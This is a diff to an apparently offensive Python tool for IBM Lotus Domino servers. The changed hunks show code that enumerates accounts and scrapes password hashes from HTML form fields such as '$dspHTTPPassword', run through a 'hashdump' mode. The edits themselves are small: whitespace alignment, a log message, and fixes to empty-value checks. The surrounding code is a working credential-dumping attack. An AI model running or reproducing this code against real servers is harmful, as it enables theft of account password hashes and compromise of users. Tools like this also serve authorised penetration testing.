@@ -148,11 +148,11 @@ def check_access(url, username, password, version):
 		'Connection': 'keep-alive'
 	}
 
-	local_paths = ['C:\\Program Files\\IBM\\',		# 9.0.1 Windows x64
-		'C:\\Program Files\\IBM\\Lotus\\', 			# 8.5.3 Windows x64
-		'C:\\Program Files (x86)\\IBM\\', 			# 9.0.1 Windows x86
-		'C:\\Program Files (x86)\\IBM\\Lotus\\',	# 8.5.3 Windows x86
-		'C:\\Lotus\\'								# Not sure, but just in case
+	local_paths = ['C:\\Program Files\\IBM\\',      # 9.0.1 Windows x64
+		'C:\\Program Files\\IBM\\Lotus\\',          # 8.5.3 Windows x64
+		'C:\\Program Files (x86)\\IBM\\',           # 9.0.1 Windows x86
+		'C:\\Program Files (x86)\\IBM\\Lotus\\',    # 8.5.3 Windows x86
+		'C:\\Lotus\\'                               # Not sure, but just in case
 	]
 
 	for local_path in local_paths:
@@ -207,6 +207,7 @@ def enum_accounts(url, header, username, password):
 			print_error('Could not connect to Domino server!')
 			break
 
+	print_good("Found {0} accounts, dumping hashes".format(len(accounts)))
 	async_requests(accounts, url, header, username, password)
 
 # Asynchronously get hashes
@@ -236,8 +237,6 @@ def async_requests(accounts, url, header, username, password):
 
 # Dump Domino hashes
 def get_domino_hash(response, **kwargs):
-	domino_username = None
-	domino_hash = None
 	soup = BeautifulSoup(response.text, 'lxml')
 
 	try:
@@ -245,21 +244,23 @@ def get_domino_hash(response, **kwargs):
 		username_params = ['$dspFullName', '$dspShortName']
 		for user_param in username_params:
 			domino_username = (soup.find('input', attrs={'name':user_param}))['value']
-			if domino_username:
+			if len(domino_username) > 0:
 				break
 			else:
+				domino_username = None
 				continue
 
 		# Get account hash
 		hash_params = ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']
 		for hash_param in hash_params:
 			domino_hash = (soup.find('input', attrs={'name':hash_param}))['value']
-			if domino_hash:
+			if len(domino_hash) > 0:
 				# Lotus Notes/Domino 5 Format
 				if len(domino_hash) > 22:
 					domino_hash = domino_hash.strip('()')
 					break
 			else:
+				domino_hash = None
 				continue
 	except:
 		pass
@@ -346,7 +347,7 @@ if __name__ == '__main__':
 
 	# Dump hashes
 	elif args.hashdump:
-		print_status('Dumping Domino account hashes...')
+		print_status('Enumerating accounts...')
 		enum_accounts(target, HEADER, username, password)
 
 	# Fingerprint
